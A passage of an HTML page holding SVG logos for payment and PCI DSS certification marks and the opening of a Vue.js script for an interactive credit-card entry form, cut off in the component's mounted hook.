                      d="M67.6826 4.30878C67.3838 4.30878 67.117 4.36295 66.8821 4.46995C66.6473 4.57783 66.4488 4.72346 66.2859 4.90504C66.1238 5.08752 65.9982 5.30107 65.9107 5.54748C65.8232 5.79344 65.7788 6.0545 65.7788 6.33154C65.7788 6.60813 65.8232 6.86964 65.9107 7.11515C65.9982 7.36112 66.1238 7.57556 66.2859 7.75759C66.4488 7.94006 66.6473 8.0848 66.8821 8.19268C67.117 8.30013 67.3838 8.35385 67.6826 8.35385C67.9681 8.35385 68.2274 8.30235 68.4605 8.19934C68.6927 8.0959 68.8929 7.95427 69.0598 7.77401C69.2268 7.5942 69.3564 7.3811 69.4483 7.13513C69.5411 6.88917 69.5873 6.62101 69.5873 6.33154C69.5873 6.04118 69.5411 5.77346 69.4483 5.5275C69.3564 5.28109 69.2268 5.06843 69.0598 4.88817C68.8929 4.70881 68.6927 4.56673 68.4605 4.46373C68.2274 4.36073 67.9681 4.30878 67.6826 4.30878ZM67.5179 3.01104C67.9703 3.01104 68.3588 3.09584 68.6842 3.26455C69.0092 3.43371 69.2814 3.6588 69.5011 3.93984V0H70.8779V9.48687H69.5011V8.72945C69.2814 9.01049 69.0092 9.23425 68.6842 9.40119C68.3588 9.56856 67.9703 9.65203 67.5179 9.65203C67.0744 9.65203 66.6615 9.56945 66.2797 9.40518C65.8974 9.24002 65.5635 9.01049 65.278 8.71613C64.9926 8.42222 64.7688 8.07192 64.6059 7.66568C64.4438 7.259 64.3621 6.81458 64.3621 6.33154C64.3621 5.84805 64.4438 5.40318 64.6059 4.99739C64.7688 4.59115 64.9926 4.24041 65.278 3.9465C65.5635 3.65214 65.8974 3.42305 66.2797 3.25789C66.6615 3.09362 67.0744 3.01104 67.5179 3.01104ZM62.9982 3.01104C63.2096 3.01104 63.3996 3.02525 63.5679 3.05411C63.7374 3.08252 63.9008 3.12736 64.0589 3.18863L63.7295 4.55253C63.5852 4.47794 63.416 4.42067 63.2229 4.3816C63.0293 4.34208 62.8486 4.32255 62.6817 4.32255C62.4624 4.32255 62.2608 4.3594 62.0765 4.43443C61.8914 4.50902 61.7338 4.61868 61.6019 4.76386C61.4701 4.9086 61.3666 5.08618 61.292 5.29752C61.2174 5.50796 61.1801 5.74771 61.1801 6.01543V9.48732H59.8038V3.17576H61.1673V3.88745C61.3782 3.58422 61.6392 3.36267 61.9509 3.22193C62.263 3.08163 62.612 3.01104 62.9982 3.01104ZM54.5787 4.30878C54.2803 4.30878 54.0135 4.36295 53.7786 4.46995C53.5433 4.57783 53.3449 4.72346 53.1828 4.90504C53.0203 5.08752 52.8942 5.30107 52.8068 5.54748C52.7193 5.79344 52.6749 6.0545 52.6749 6.33154C52.6749 6.60813 52.7193 6.86964 52.8068 7.11515C52.8947 7.36112 53.0203 7.57556 53.1828 7.75759C53.3449 7.94006 53.5433 8.0848 53.7786 8.19268C54.0135 8.30013 54.2803 8.35385 54.5787 8.35385C54.8642 8.35385 55.1234 8.30235 55.3565 8.19934C55.5892 8.0959 55.789 7.95427 55.9559 7.77401C56.1228 7.5942 56.2525 7.3811 56.3448 7.13513C56.4376 6.88917 56.4829 6.62101 56.4829 6.33154C56.4829 6.04118 56.4376 5.77346 56.3448 5.5275C56.2525 5.28109 56.1228 5.06843 55.9559 4.88817C55.789 4.70881 55.5896 4.56673 55.3565 4.46373C55.1234 4.36073 54.8642 4.30878 54.5787 4.30878ZM57.7744 9.48687H56.3972V8.72945C56.1779 9.01049 55.9057 9.23425 55.5807 9.40118C55.2553 9.56856 54.8668 9.65203 54.414 9.65203C53.9704 9.65203 53.558 9.56945 53.1757 9.40518C52.7939 9.24002 52.46 9.01049 52.1741 8.71613C51.8886 8.42222 51.6649 8.07192 51.5028 7.66568C51.3399 7.259 51.2586 6.81458 51.2586 6.33154C51.2586 5.84805 51.3399 5.40318 51.5028 4.99739C51.6649 4.59115 51.8886 4.24041 52.1741 3.9465C52.46 3.65214 52.7939 3.42305 53.1757 3.25789C53.558 3.09318 53.9704 3.0106 54.414 3.0106C54.8668 3.0106 55.2553 3.09584 55.5807 3.26455C55.9057 3.43371 56.1779 3.6588 56.3972 3.9394V3.17576H57.7744V9.48687ZM48.0762 3.01104C48.5508 3.01104 48.9921 3.09584 49.4006 3.26455C49.809 3.43371 50.1536 3.68544 50.4346 4.01931L49.5515 4.96143C49.3278 4.7501 49.0956 4.58893 48.8545 4.47661C48.6121 4.36517 48.3399 4.30878 48.0367 4.30878C47.7739 4.30878 47.5279 4.35807 47.2992 4.45707C47.0706 4.55563 46.873 4.69371 46.7061 4.87219C46.5396 5.05022 46.4086 5.26289 46.3145 5.51107C46.2195 5.75925 46.1729 6.0323 46.1729 6.33154C46.1729 6.63033 46.2195 6.90338 46.3145 7.15156C46.4086 7.3993 46.5396 7.61241 46.7061 7.79088C46.873 7.96847 47.0706 8.107 47.2992 8.20511C47.5279 8.30456 47.7739 8.35385 48.0367 8.35385C48.3399 8.35385 48.6227 8.29125 48.8865 8.16604C49.1502 8.04084 49.3833 7.88412 49.5848 7.69454L50.4346 8.64376C50.1456 8.97808 49.7979 9.22892 49.3948 9.39763C48.9895 9.56723 48.5513 9.65203 48.0767 9.65203C47.5763 9.65203 47.1212 9.56723 46.7132 9.39763C46.3047 9.22892 45.9553 8.99628 45.6654 8.6997C45.3759 8.40313 45.1517 8.05283 44.9937 7.64881C44.8356 7.24479 44.7562 6.8057 44.7562 6.33154C44.7562 5.85693 44.8356 5.41783 44.9937 5.01337C45.1517 4.6098 45.3759 4.2595 45.6654 3.96293C45.9553 3.66635 46.3047 3.43371 46.7132 3.26455C47.1208 3.09584 47.5758 3.01104 48.0762 3.01104ZM43.3656 3.01104C43.577 3.01104 43.767 3.02525 43.9361 3.05411C44.1053 3.08252 44.2687 3.12736 44.4267 3.18863L44.0973 4.55253C43.9526 4.47794 43.7834 4.42067 43.5898 4.3816C43.3967 4.34208 43.2165 4.32255 43.0504 4.32255C42.8302 4.32255 42.6282 4.3594 42.4435 4.43443C42.2588 4.50902 42.1012 4.61868 41.9693 4.76386C41.8375 4.9086 41.7345 5.08618 41.6599 5.29752C41.5853 5.50796 41.548 5.74771 41.548 6.01543V9.48732H40.1712V3.17576H41.5347V3.88745C41.7456 3.58422 42.0071 3.36267 42.3187 3.22193C42.63 3.08163 42.9789 3.01104 43.3656 3.01104ZM35.5858 4.23642C35.3399 4.23642 35.1214 4.27371 34.9301 4.3483C34.7392 4.42333 34.5745 4.52944 34.4364 4.66796C34.2979 4.80648 34.1847 4.97075 34.0967 5.16211C34.0088 5.35301 33.9476 5.56301 33.9121 5.79122H37.1868C37.1122 5.29929 36.9369 4.91703 36.6598 4.64487C36.3828 4.37272 36.0249 4.23642 35.5858 4.23642ZM35.612 3.01104C36.0511 3.01104 36.4547 3.09096 36.821 3.25168C37.1877 3.41151 37.5016 3.63794 37.7631 3.93007C38.0246 4.22221 38.2284 4.57162 38.3758 4.97741C38.5227 5.38409 38.5969 5.83295 38.5969 6.32532C38.5969 6.41278 38.5942 6.50069 38.5902 6.5886C38.5858 6.67651 38.5782 6.75997 38.5707 6.83856H33.9058C33.9498 7.12403 34.031 7.36822 34.1496 7.57023C34.2681 7.77224 34.4111 7.93784 34.5776 8.06748C34.7445 8.19668 34.9314 8.29258 35.1379 8.35385C35.3443 8.416 35.5592 8.44619 35.7834 8.44619C36.0995 8.44619 36.417 8.38803 36.7353 8.27171C37.0541 8.15539 37.3449 7.99201 37.6082 7.78112L38.2936 8.7623C37.9074 9.09173 37.4976 9.3226 37.0647 9.45402C36.6318 9.58588 36.1763 9.65203 35.6977 9.65203C35.2236 9.65203 34.7885 9.57256 34.3933 9.4145C33.9982 9.25689 33.6577 9.03268 33.3722 8.74277C33.0867 8.45241 32.8647 8.10389 32.7067 7.69499C32.549 7.28697 32.4696 6.83234 32.4696 6.33198C32.4696 5.83961 32.5464 5.38942 32.7 4.98096C32.8541 4.57295 33.0694 4.22265 33.346 3.93052C33.6226 3.63794 33.9529 3.41195 34.3374 3.25168C34.7214 3.09096 35.1467 3.01104 35.612 3.01104ZM31.3761 4.42733H28.9582V7.17509C28.9582 7.38509 28.9848 7.56535 29.0372 7.71497C29.09 7.86414 29.1615 7.98623 29.2512 8.0808C29.3413 8.17492 29.447 8.24418 29.5673 8.28814C29.6881 8.33209 29.8186 8.35385 29.9598 8.35385C30.1751 8.35385 30.3931 8.31256 30.6151 8.22864C30.8371 8.14518 31.0422 8.0444 31.2313 7.92585L31.7779 9.02602C31.523 9.19696 31.2367 9.34436 30.9183 9.46734C30.5996 9.59032 30.2408 9.65203 29.8408 9.65203C29.1251 9.65203 28.5679 9.45357 28.171 9.05577C27.7732 8.65797 27.5747 8.0404 27.5747 7.20129V4.42733H26.3165V3.17576H27.5747V1.26533H28.9582V3.17576H31.3761V4.42733ZM24.8407 4.75676C24.7444 4.69993 24.6259 4.63955 24.4851 4.57561C24.3448 4.51212 24.1885 4.45441 24.0172 4.40113C23.8458 4.34874 23.6646 4.30479 23.4737 4.26971C23.2828 4.23464 23.0884 4.21688 22.8908 4.21688C22.513 4.21688 22.22 4.28614 22.0113 4.42422C21.8026 4.56229 21.6983 4.74388 21.6983 4.96809C21.6983 5.07775 21.7258 5.16965 21.7804 5.24424C21.8359 5.31927 21.9092 5.38098 22.0011 5.42893C22.0939 5.47777 22.2031 5.51595 22.3305 5.54437C22.4579 5.57323 22.5942 5.59809 22.7394 5.61984L23.3912 5.71885C24.0807 5.81963 24.6188 6.02075 25.0055 6.32177C25.3922 6.62234 25.5853 7.04323 25.5853 7.5831C25.5853 7.88634 25.5205 8.16427 25.3908 8.41645C25.2612 8.66907 25.0747 8.88706 24.831 9.06865C24.5872 9.25112 24.2862 9.39275 23.9284 9.49398C23.5705 9.59476 23.1647 9.64493 22.7128 9.64493C22.5503 9.64493 22.3611 9.6356 22.1463 9.61563C21.9309 9.59565 21.7027 9.55613 21.4616 9.49753C21.2197 9.43803 20.9737 9.35546 20.7233 9.25023C20.4734 9.14501 20.2332 9.00605 20.0054 8.83512L20.6443 7.80065C20.7584 7.88856 20.8823 7.9707 21.0163 8.0475C21.1504 8.12431 21.3018 8.19268 21.471 8.25173C21.6401 8.31122 21.827 8.35873 22.0308 8.39336C22.2355 8.42843 22.4672 8.44619 22.7261 8.44619C23.2007 8.44619 23.5585 8.37693 23.8001 8.23886C24.0416 8.10078 24.1623 7.91298 24.1623 7.67545C24.1623 7.49564 24.0744 7.34735 23.8986 7.23059C23.7228 7.11471 23.4462 7.02991 23.0688 6.97752L22.41 6.89139C21.7072 6.79505 21.1748 6.58993 20.8126 6.2756C20.4498 5.96171 20.2687 5.55014 20.2687 5.04001C20.2687 4.72834 20.3291 4.4473 20.4498 4.19735C20.5706 3.94694 20.7442 3.73472 20.9706 3.56113C21.1966 3.38798 21.4701 3.2539 21.7906 3.15977C22.1112 3.06476 22.4739 3.01815 22.8779 3.01815C23.3743 3.01815 23.8414 3.07631 24.2813 3.19263C24.7204 3.30851 25.1045 3.47233 25.4339 3.68322L24.8407 4.75676ZM15.321 4.30878C15.0227 4.30878 14.7558 4.36295 14.521 4.46995C14.2861 4.57783 14.0872 4.72346 13.9247 4.90504C13.7622 5.08752 13.637 5.30107 13.5491 5.54748C13.4612 5.79344 13.4172 6.0545 13.4172 6.33154C13.4172 6.60813 13.4612 6.86964 13.5491 7.11515C13.637 7.36112 13.7622 7.57556 13.9247 7.75759C14.0872 7.94006 14.2857 8.0848 14.521 8.19268C14.7558 8.30013 15.0227 8.35385 15.321 8.35385C15.6069 8.35385 15.8658 8.30235 16.0984 8.19934C16.3315 8.0959 16.5313 7.95427 16.6982 7.77401C16.8652 7.5942 16.9948 7.3811 17.0872 7.13513C17.1791 6.88917 17.2252 6.62101 17.2252 6.33154C17.2252 6.04118 17.1791 5.77346 17.0872 5.5275C16.9948 5.28109 16.8652 5.06843 16.6982 4.88817C16.5313 4.70881 16.3315 4.56673 16.0984 4.46373C15.8662 4.36073 15.6069 4.30878 15.321 4.30878ZM18.5163 9.48687H17.1395V8.72945C16.9198 9.01049 16.6476 9.23425 16.3226 9.40118C15.9976 9.56856 15.6087 9.65203 15.1567 9.65203C14.7128 9.65203 14.3003 9.56945 13.9181 9.40518C13.5358 9.24002 13.2019 9.01049 12.9164 8.71613C12.631 8.42222 12.4072 8.07192 12.2447 7.66568C12.0822 7.259 12.001 6.81458 12.001 6.33154C12.001 5.84805 12.0822 5.40318 12.2447 4.99739C12.4072 4.59115 12.6314 4.24041 12.9164 3.9465C13.2019 3.65214 13.5358 3.42305 13.9181 3.25789C14.3003 3.09318 14.7128 3.0106 15.1567 3.0106C15.6087 3.0106 15.9976 3.09584 16.3226 3.26455C16.6476 3.43371 16.9198 3.6588 17.1395 3.9394V3.17576H18.5163V9.48687ZM10.677 9.48687H9.18794V1.898L6.49389 8.58427H4.92577L2.23128 1.96992V9.48687H0.742188V0.264166H3.02866L5.70983 6.85188L8.391 0.264166H10.677V9.48687Z"
                      fill="#6F7D88"></path>
            </svg>
            <svg id="svg-mir-accept" viewBox="0 0 485 188" style="width: 10%; margin: 20px 10px;">
                <path fill="#6f7d88"
                      d="M199.7060547 58.8237305h-45.0820313c2.737793 14.8876953 15.7661133 26.1728516 31.4482422 26.1728516h35.006836c.2851562-1.406738.4379882-2.867187.4379882-4.359863 0-12.04834-9.7651367-21.812988-21.811035-21.812988">
                </path>
                <path fill="#6f7d88"
                      d="M119.7236328 58.8237305H99.392578c-5.1801757 0-9.7392577 3.428711-11.1762694 8.4067383l-8.4829102 29.4023438H78.283203l-8.4819335-29.4023438c-1.4379883-4.9780273-5.9956055-8.4067383-11.1767578-8.4067383H38.293457v63.9838867h20.3588867V84.996582h1.4541016l11.6289063 37.8110352h14.5429688L97.9125977 84.996582h1.4536133v37.8110352h20.357422V58.8237305m8.7255858-.0004883h20.3598633v63.984375h-20.359863zm91.800293 29.0844726H157.533203v34.8999023h20.3203126v-20.359375h9.7280273l10.667968 20.366211h23.268066l-14.442383-21.662109c6.1342773-2.20996 10.995117-7.088867 13.1743163-13.244628">
                </path>
                <path fill="#6f7d88"
                      d="M242.2685547 105.482422l2.2441406-7.598633c.709961-2.4609374 1.5820313-6.7255858 1.5820313-6.7255858h.111328s.875 4.2646484 1.5839845 6.725586l2.185547 7.5986327h-7.707031m8.91211-23.235352h-10.057617l-13.28418 39.086914h9.839844l2.3496097-8.198242h12.1914064l2.4052734 8.198242h9.839844l-13.28418-39.086914m34.769531-.654297c-12.0830077 0-20.501953 8.74707-20.501953 20.11914 0 11.5878903 7.9257813 20.28125 20.501953 20.28125 7.1601564 0 12.301758-3.0078128 15.7451173-6.560547l-4.9228517-7c-2.677735 2.6816404-6.504883 4.8134764-10.384766 4.8134764-7.5439454 0-11.042969-5.9580078-11.042969-11.7548828 0-5.6308597 3.2226564-11.1513675 11.042969-11.1513675 3.4951173 0 7.272461 1.803711 9.78418 3.9902344l4.427734-7.2182616c-3.8271484-3.7700198-9.4023437-5.519043-14.649414-5.519043m38.1572268 0c-12.0820315 0-20.5019533 8.74707-20.5019533 20.1191403 0 11.5878907 7.930664 20.28125 20.501953 20.28125 7.161133 0 12.3007816-3.0078124 15.7451175-6.560547l-4.9208983-7c-2.676758 2.6816408-6.5058595 4.8134768-10.3857423 4.8134768-7.544922 0-11.0429687-5.9580077-11.0429687-11.7548827 0-5.6308596 3.2246094-11.1513674 11.0429688-11.1513674 3.498047 0 7.2695314 1.803711 9.7841798 3.9902344l4.4277344-7.2182617c-3.826172-3.7700197-9.4033203-5.519043-14.6503906-5.519043m45.1015625.654297h-24.491211v39.086914h25.2578124v-8.198242H354.28125v-7.3808598h11.9189453v-8.199218H354.28125v-7.108398h14.9277344m47.3808594 10.4628908h-39.975586v20.5683593h9.5654298v-12.080078H404.65625c5.836914 0 10.2138672-3.362305 11.9335938-8.488281">
                </path>
                <path fill="#6f7d88"
                      d="M416.6376953 95.013672c-.5664063-5.9628907-4.9648438-11.0717774-10.765625-12.536133-3.0673828-.7666015-6.5419922-.4296874-9.6728516-.4296874h-23.4365234c2.2822266 10.7617188 11.0263672 17.1953125 21.5576172 17.1953125h22.1015624c.313476-1.208984.270507-3.657226.21582-4.229492-.013672-.145508.042969.450196 0 0">
                </path>
                <path fill="#6f7d88"
                      d="M457.2070313 80.919922h-37.0927735v9.1347655h13.2158203v34.415039h10.660157v-34.415039h13.216797M94.484864.305664C42.822754.305664.7929688 42.3359376.7929688 93.9970705c0 51.665039 42.0297852 93.6972656 93.6918945 93.6972656 28.6640625 0 54.3500977-12.947265 71.5458984-33.295898l282.2983398-.001953c.1992188-1.228515.3066406-2.498047.3066406-3.803711 0-9.877929-6.098632-17.978515-13.89746-18.909179-.231445-.027344-1.49707-.114258-1.49707-.114258H156.51709l-.6333008.975586c-12.8549806 20.4013675-35.5546876 34.00293-61.398926 34.00293-40.001953 0-72.5458983-32.546875-72.5458983-72.5507812 0-40.0009765 32.543945-72.544922 72.545898-72.544922 24.270996 0 45.78125 11.9916994 58.958008 30.348633h24.65625C162.6328125 21.2836918 130.974121.305664 94.4848632.305664">
                </path>
            </svg>
            <svg id="svg-pci-dss" viewBox="0 0 69 27" style="width: 10%; margin: 20px 10px;">
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M46.5067 15.7451L47.1803 15.9488C47.1348 16.1376 47.0638 16.2954 46.9671 16.4221C46.8704 16.5496 46.7495 16.6456 46.6042 16.7104C46.4604 16.774 46.2773 16.8059 46.0547 16.8059C45.7841 16.8059 45.5629 16.7672 45.391 16.6899C45.2206 16.6103 45.073 16.4716 44.9479 16.2737C44.8238 16.0759 44.7617 15.8222 44.7617 15.513C44.7617 15.1014 44.8709 14.7853 45.0892 14.5646C45.3091 14.3428 45.6188 14.232 46.0186 14.232C46.3319 14.232 46.5779 14.2956 46.757 14.423C46.9371 14.5504 47.0706 14.7449 47.1578 15.0064L46.479 15.1565C46.456 15.0804 46.4313 15.0251 46.4047 14.991C46.362 14.9318 46.3097 14.887 46.2478 14.8563C46.1855 14.8245 46.116 14.8085 46.0389 14.8085C45.8649 14.8085 45.7314 14.8784 45.6385 15.0183C45.5684 15.123 45.5332 15.2866 45.5332 15.5096C45.5332 15.7859 45.5754 15.9752 45.6594 16.0776C45.7438 16.1799 45.8619 16.2311 46.0135 16.2311C46.1606 16.2311 46.2715 16.1902 46.346 16.1083C46.4222 16.0264 46.4772 15.907 46.5111 15.7501L46.5067 15.7451ZM47.4552 15.5193C47.4552 15.1133 47.5683 14.7972 47.7946 14.5709C48.0205 14.3447 48.3355 14.2314 48.7393 14.2314C49.1534 14.2314 49.4727 14.3428 49.6969 14.5658C49.9213 14.7875 50.0336 15.0988 50.0336 15.4998C50.0336 15.7908 49.9844 16.0293 49.8859 16.2156C49.7893 16.401 49.6483 16.546 49.4629 16.6505C49.2788 16.7536 49.049 16.8051 48.774 16.8051C48.4943 16.8051 48.2623 16.7607 48.0782 16.672C47.8962 16.5833 47.7478 16.4418 47.6331 16.2476C47.5193 16.0542 47.4625 15.8122 47.4625 15.521L47.4552 15.5193ZM48.2235 15.5227C48.2235 15.7738 48.2699 15.9543 48.3626 16.0641C48.4559 16.1738 48.5826 16.2287 48.7429 16.2287C48.9078 16.2287 49.0357 16.1746 49.1266 16.0663C49.2165 15.9582 49.2614 15.7651 49.2614 15.4876C49.2614 15.2534 49.2136 15.0826 49.1181 14.9753C49.0238 14.8662 48.8959 14.8116 48.7344 14.8116C48.5787 14.8116 48.4542 14.8662 48.3609 14.9753C48.2666 15.0833 48.2194 15.2648 48.2194 15.5195L48.2235 15.5227ZM50.441 14.2737H51.4519L51.8425 15.7874L52.2308 14.2737H53.2386V16.7614H52.6111V14.8646L52.125 16.7614H51.5571L51.0728 14.8646V16.7614H50.4418V14.2739L50.441 14.2737ZM53.7235 14.2737H55.0015C55.2795 14.2737 55.4875 14.3399 55.6255 14.4723C55.7648 14.6045 55.8344 14.7926 55.8344 15.0366C55.8344 15.2875 55.7585 15.4835 55.6069 15.6245C55.4563 15.7656 55.2263 15.836 54.9166 15.836H54.4957V16.7595H53.7237V14.271L53.7235 14.2737ZM54.4957 15.3342H54.684C54.832 15.3342 54.9362 15.3088 54.996 15.258C55.0561 15.2059 55.0861 15.1399 55.0861 15.0596C55.0861 14.9815 55.06 14.9153 55.008 14.861C54.956 14.8065 54.8582 14.7792 54.7147 14.7792H54.495V15.3335L54.4957 15.3342ZM56.2381 14.2737H57.0055V16.1491H58.2044V16.7614H56.2364V14.2739L56.2381 14.2737ZM58.5881 14.2737H59.3572V16.7614H58.5864V14.2739L58.5881 14.2737ZM61.4378 16.3508H60.5612L60.4401 16.7616H59.6539L60.5885 14.2746H61.4258L62.3604 16.7633H61.5571L61.4344 16.3539L61.4378 16.3508ZM61.2758 15.813L60.9995 14.9189L60.7249 15.813H61.2723H61.2758ZM62.6128 14.2737H63.3307L64.267 15.6499V14.2737H64.9918V16.7614H64.267L63.3358 15.3955V16.7618H62.6128V14.2736V14.2737ZM65.3294 14.2737H67.6658V14.8882H66.8813V16.7614H66.1139V14.8885H65.3294V14.2741V14.2737Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M11.128 11.2598H10.1836V13.9661L10.1867 13.9649L11.2406 13.9666C11.2406 13.9666 12.4344 13.9127 12.61 12.8129C12.6288 12.7873 12.6356 12.3301 12.61 12.2568C12.5026 11.3219 11.128 11.2598 11.128 11.2598Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M10.3116 16.2619C10.2784 16.2607 10.2519 16.286 10.2519 16.3177V19.322C10.2519 19.3539 10.2253 19.3805 10.1926 19.3805H6.33195C6.29887 19.3805 6.27277 19.3539 6.27277 19.3208L6.27294 19.3214V9.06637C6.27294 9.03447 6.30023 9.00633 6.33263 9.00633C6.33263 9.00633 11.3093 9.00803 11.3349 9.00633C12.6077 8.94662 16.4743 9.30449 16.4743 12.5696C16.4743 16.7076 10.3116 16.2619 10.3116 16.2619ZM31.1372 3.4512C32.4742 3.4512 33.5599 4.47346 33.5599 5.73537C33.5599 6.99729 32.4754 8.02023 31.1379 8.02023L31.1374 8.02125C29.7992 8.02125 28.715 6.99848 28.715 5.73623C28.715 4.47414 29.7992 3.4512 31.1372 3.4512ZM25.0915 19.4602C24.9704 19.4602 23.8261 19.5042 23.2428 19.4602C17.2655 19.0826 17.2655 14.818 17.2655 14.6943V13.682C17.2655 13.4913 17.4786 9.32036 23.2428 8.8581C23.6248 8.80419 25.0062 8.81119 25.0915 8.8581C26.6775 8.95242 27.1976 9.29136 27.1976 9.29136C27.2266 9.30705 27.2505 9.34696 27.2505 9.3804V12.0025C27.2505 12.0351 27.2266 12.0487 27.1993 12.0322L27.1925 12.033C27.1925 12.033 26.2665 11.4616 25.1119 11.3064H24.1347C21.5204 11.5281 21.3413 13.6228 21.3413 13.6228C21.3379 13.6552 21.3345 13.7081 21.3345 13.7405V14.4859C21.3345 14.5183 21.3379 14.5712 21.3413 14.6036C21.3413 14.6036 21.4692 16.5584 24.1364 17.007C24.3292 17.0394 24.5816 17.0667 25.1153 17.007C26.9964 16.8245 27.4244 16.4799 27.4244 16.4799C27.4534 16.4627 27.4756 16.4746 27.4756 16.5081V16.9406C28.0308 17.0334 28.6074 17.2953 29.1562 17.6669V9.01161V9.01127H33.1195V15.465C34.5169 13.4524 36.0001 11.4019 36.4953 10.7196L36.4948 10.7191L32.1297 0.992188L0.173828 2.80711L9.02679 26.9691L26.0686 21.5963C25.5896 20.9058 25.2455 20.1577 25.1186 19.4597C25.1094 19.4597 25.1007 19.4602 25.0915 19.4602Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M31.2471 24.3595C31.5695 24.3595 31.8159 24.3595 32.2231 24.1787C33.6306 23.4387 38.3671 11.8686 43.363 8.30972C43.392 8.28686 43.4334 8.25377 43.4573 8.21983C43.4894 8.17292 43.4906 8.12499 43.4906 8.12499C43.4906 8.12499 43.4906 7.88789 42.7497 7.88789C38.3021 7.76678 33.6771 17.0921 31.247 20.7817C31.2163 20.8226 31.0491 20.7817 31.0491 20.7817C31.0491 20.7817 29.4205 18.8593 28.005 18.1224C27.976 18.1071 27.814 18.0576 27.6469 18.0695C27.5361 18.0695 26.8778 18.2009 26.5708 18.5267C26.2093 18.9088 26.2161 19.1237 26.2195 19.5894C26.2212 19.6269 26.2451 19.7821 26.2894 19.8606C26.6356 20.4661 28.2165 22.6392 29.5109 23.8384C29.7121 23.9817 30.0174 24.362 31.2487 24.362L31.2471 24.3595Z"
                      fill="#6F7D88"></path>
                <path fill-rule="evenodd" clip-rule="evenodd"
                      d="M44.6758 4.80334H48.3765C49.1064 4.80334 49.6949 4.90228 50.1419 5.10014C50.5928 5.29818 50.9649 5.58253 51.2582 5.95302C51.5515 6.32266 51.764 6.75319 51.896 7.24479C52.0278 7.73604 52.0938 8.2563 52.0938 8.80555C52.0938 9.66644 51.9949 10.3356 51.7971 10.8132C51.6029 11.2862 51.3315 11.6843 50.9833 12.0072C50.6351 12.3257 50.2611 12.5377 49.8615 12.6435C49.3153 12.789 48.8202 12.8618 48.3766 12.8618H44.676V4.80061L44.6758 4.80334ZM47.167 6.62935V11.0353H47.7762C48.2968 11.0353 48.667 10.9785 48.887 10.8647C49.1069 10.7475 49.2789 10.5463 49.4031 10.2609C49.5272 9.97092 49.5893 9.50354 49.5893 8.85877C49.5893 8.00487 49.4496 7.42031 49.1703 7.10526C48.8918 6.7902 48.4297 6.63276 47.7842 6.63276H47.1629L47.167 6.62935ZM52.7714 10.1995L55.1402 10.0511C55.1913 10.4366 55.2953 10.73 55.4522 10.9313C55.708 11.2576 56.0745 11.4208 56.5522 11.4208C56.908 11.4208 57.181 11.3384 57.3708 11.1735C57.564 11.0051 57.6607 10.8107 57.6607 10.5901C57.6607 10.382 57.5686 10.1956 57.3844 10.0306C57.2003 9.86567 56.7751 9.71062 56.1088 9.56495C55.0162 9.31932 54.2368 8.99301 53.7707 8.58585C53.3012 8.17988 53.0664 7.66133 53.0664 7.0302C53.0664 6.61622 53.1858 6.22628 53.4245 5.86006C53.6655 5.49042 54.0265 5.20112 54.5075 4.99183C54.9918 4.77912 55.6535 4.67285 56.4925 4.67285C57.5214 4.67285 58.3052 4.8656 58.8442 5.2511C59.3854 5.63319 59.7077 6.24214 59.811 7.07796L57.4629 7.21613C57.4003 6.85349 57.2678 6.58961 57.0655 6.42466C56.8665 6.25971 56.5914 6.17733 56.2401 6.17733C55.9502 6.17733 55.7319 6.23993 55.5853 6.36496C55.4374 6.48658 55.3634 6.63498 55.3634 6.81016C55.3634 6.93877 55.4238 7.05408 55.5443 7.15643C55.6613 7.26338 55.94 7.36282 56.3798 7.45493C57.469 7.69033 58.248 7.92913 58.7168 8.17135C59.1899 8.41016 59.5327 8.70747 59.7454 9.06346C59.9625 9.41945 60.0711 9.8174 60.0711 10.2575C60.0711 10.7748 59.9278 11.2519 59.6412 11.6886C59.3548 12.1253 58.9553 12.4572 58.4425 12.6843C57.9308 12.906 57.2847 13.0169 56.5043 13.0169C55.1332 13.0169 54.1833 12.753 53.6551 12.2254C53.1264 11.6977 52.8273 11.0268 52.7581 10.2126L52.7714 10.1995ZM60.7167 10.1995L63.0855 10.0511C63.1365 10.4366 63.2407 10.73 63.3976 10.9313C63.6534 11.2576 64.0201 11.4208 64.4976 11.4208C64.8535 11.4208 65.1262 11.3384 65.3162 11.1735C65.5104 11.0051 65.6078 10.8107 65.6078 10.5901C65.6078 10.382 65.5157 10.1956 65.3315 10.0306C65.1473 9.86567 64.722 9.71062 64.0559 9.56495C62.9632 9.31932 62.1841 8.99301 61.7178 8.58585C61.2481 8.17988 61.0135 7.66133 61.0135 7.0302C61.0135 6.61622 61.1323 6.22628 61.3699 5.86006C61.6121 5.49042 61.9729 5.20112 62.4528 4.99183C62.936 4.77912 63.5976 4.67285 64.4377 4.67285C65.4669 4.67285 66.2507 4.8656 66.7894 5.2511C67.3319 5.63319 67.6542 6.24214 67.7564 7.07796L65.4099 7.21442C65.3463 6.85161 65.2138 6.5879 65.0124 6.42295C64.8146 6.25801 64.5395 6.17562 64.1872 6.17562C63.8971 6.17562 63.679 6.23822 63.5323 6.36325C63.3845 6.48487 63.3106 6.63396 63.3106 6.81016C63.3106 6.93877 63.371 7.05408 63.4914 7.15643C63.6084 7.26338 63.887 7.36282 64.327 7.45493C65.4163 7.68913 66.1956 7.92743 66.6651 8.16964C67.137 8.40845 67.4796 8.70576 67.6934 9.06175C67.9095 9.41774 68.0175 9.8157 68.0175 10.2558C68.0175 10.7733 67.8747 11.2502 67.5894 11.6869C67.3029 12.1236 66.9027 12.4557 66.3888 12.6831C65.8772 12.9058 65.2314 13.0174 64.4514 13.0174C63.0802 13.0174 62.1305 12.753 61.6017 12.2242C61.0744 11.6966 60.7752 11.0258 60.7048 10.2114L60.7167 10.1995Z"
                      fill="#6F7D88"></path>
            </svg>
        </center>
    </div>

</div>

<script src="https://cdnjs.cloudflare.com/ajax/libs/vue/2.6.10/vue.min.js"></script>
<script src="https://unpkg.com/vue-the-mask@0.11.1/dist/vue-the-mask.js"></script>
<script type="text/javascript">new Vue({
  el: "#app",
  data() {
    return {
      currentCardBackground: Math.floor(Math.random() * 25 + 1), // just for fun :D
      cardName: "",
      cardNumber: "",
      cardMonth: "",
      cardYear: "",
      cardCvv: "",
      minCardYear: new Date().getFullYear(),
      amexCardMask: "#### ###### #####",
      otherCardMask: "#### #### #### ####",
      cardNumberTemp: "",
      isCardFlipped: false,
      focusElementStyle: null,
      isInputFocused: false
    };
  },
  mounted() {
    this.cardNumberTemp = this.otherCardMask;
